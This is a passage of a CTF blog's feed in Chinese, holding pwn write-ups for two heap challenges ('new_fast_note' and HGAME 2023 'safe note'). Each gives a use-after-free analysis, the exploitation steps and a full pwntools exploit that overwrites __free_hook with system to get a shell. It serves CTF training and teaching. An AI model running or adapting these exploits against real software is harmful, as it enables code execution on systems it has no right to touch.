class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="new-fast-note"><a href="#new-fast-note" class="headerlink" title="new_fast_note"></a>new_fast_note</h2><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>delete中free之后未清零造成uaf漏洞</p><h3 id="利用思路-3"><a href="#利用思路-3" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.填充tcache，再add一个进入unsorted bin，利用uaf漏洞showunsorted bin中的chunk，泄露libc地址并计算free_hook和system</p><p>2.填充tcache大小小于0x90，再add相同大小的chunk，double free之后进入fast bin</p><p>3.申请tcache和fast bin前两个chunk为free_hook，再申请掉fast bin中最后一个chunk，此时该chunk在free_hook地址，将其内容设置为system即可完成任意地址写</p><p>4.申请堆内容为&#x2F;bin&#x2F;sh，再free掉，等同于执行system（&#x2F;bin&#x2F;sh），即可getshell</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./vuln'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'bbb'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'bbb'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>malloc_hook <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">96</span> <span class="token operator">-</span> <span class="token number">0x10</span>li<span class="token punctuation">(</span><span class="token string">'malloc_hook = '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basesystem <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseadd<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;YukkuriSay&quot;&gt;&lt;a href=&quot;#YukkuriSay&quot; class=&quot;headerlink&quot; title=&quot;YukkuriSay&quot;&gt;&lt;/a&gt;YukkuriSay&lt;/h2&gt;&lt;h3 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;head</summary>
      
    
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="heap" scheme="https://starrysky1004.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>HGAME 2023 week3 pwn</title>
    <link href="https://starrysky1004.github.io/2023/01/27/hgame-2023-week3-pwn/hgame-2023-week3-pwn/"/>
    <id>https://starrysky1004.github.io/2023/01/27/hgame-2023-week3-pwn/hgame-2023-week3-pwn/</id>
    <published>2023-01-27T01:05:54.000Z</published>
    <updated>2023-02-05T12:03:51.069Z</updated>
    
    <content type="html"><![CDATA[<h2 id="safe-note"><a href="#safe-note" class="headerlink" title="safe note"></a>safe note</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>free之后未清零造成UAF漏洞</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>libc版本是2.32，要注意异或加密fd，加密方式为(堆地址&gt;&gt;12)&amp;申请的地址</p><p>1.创建并释放一个堆获取堆地址</p><p>2.填充tcache，利用unsorted bin泄露libc，计算出free_hook和system（show之前要edit</p><p>3.利用UAF漏洞实现任意地址写，把free_hook改成system，改fd的时候要使用2.32的加密方式进行加密</p><p>4.创建一个内容为&#x2F;bin&#x2F;sh的堆并将其释放</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-none"><code class="language-none">from pwn import *context(arch&#x3D;&#39;amd64&#39;, os&#x3D;&#39;linux&#39;, log_level&#x3D;&#39;debug&#39;)file_name &#x3D; &#39;.&#x2F;vuln&#39;li &#x3D; lambda x : print(&#39;\x1b[01;38;5;214m&#39; + x + &#39;\x1b[0m&#39;)ll &#x3D; lambda x : print(&#39;\x1b[01;38;5;1m&#39; + x + &#39;\x1b[0m&#39;)context.terminal &#x3D; [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]debug &#x3D; 0if debug:    r &#x3D; remote()else:    r &#x3D; process(file_name)elf &#x3D; ELF(file_name)def dbg():    gdb.attach(r)def add(index, size):    r.sendlineafter(&#39;&gt;&#39;, b&#39;1&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))    r.sendlineafter(&#39;Size: &#39;, str(size))def delete(index):    r.sendlineafter(&#39;&gt;&#39;, b&#39;2&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))def edit(index, content):    r.sendlineafter(&#39;&gt;&#39;, b&#39;3&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))    r.sendlineafter(&#39;Content: &#39;, content)def show(index):    r.sendlineafter(&#39;&gt;&#39;, b&#39;4&#39;)    r.sendlineafter(&#39;Index: &#39; , str(index))add(0, 0x90)delete(0)show(0)heap &#x3D; u64(r.recv(5)[-5:].ljust(8, b&#39;\x00&#39;)) &lt;&lt; 12li(&#39;heap &#x3D; &#39; + hex(heap))for i in range(8):    add(i + 1 , 0x80)add(9, 0x20)add(10, 0x20)for i in range(8):    delete(i + 1)edit(8, &#39;&#39;)show(8)malloc_hook &#x3D; u64(r.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;)) - 106 - 0x10li(&#39;malloc_hook &#x3D; &#39; + hex(malloc_hook))libc &#x3D; ELF(&#39;.&#x2F;2.32-0ubuntu3.2_amd64&#x2F;libc-2.32.so&#39;)libc_base &#x3D; malloc_hook - libc.sym[&#39;__malloc_hook&#39;]free_hook &#x3D; libc_base + libc.sym[&#39;__free_hook&#39;]li(&#39;free_hook &#x3D; &#39; + hex(free_hook))system &#x3D; libc_base + libc.sym[&#39;system&#39;]li(&#39;system &#x3D; &#39; + hex(system))li(&#39;heap &#x3D; &#39; + hex(heap))delete(9)delete(10)edit(10, p64((heap&gt;&gt;12)  ^ free_hook))add(11, 0x20)edit(11, b&#39;&#x2F;bin&#x2F;sh\x00&#39;)add(12, 0x20)edit(12, p64(system))delete(11)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;safe-note&quot;&gt;&lt;a href=&quot;#safe-note&quot; class=&quot;headerlink&quot; title=&quot;safe note&quot;&gt;&lt;/a&gt;safe note&lt;/h2&gt;&lt;h3 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="UAF" scheme="https://starrysky1004.github.io/tags/UAF/"/>
    
    <category term="heap" scheme="https://starrysky1004.github.io/tags/heap/"/>
    
  </entry>
  
</feed>
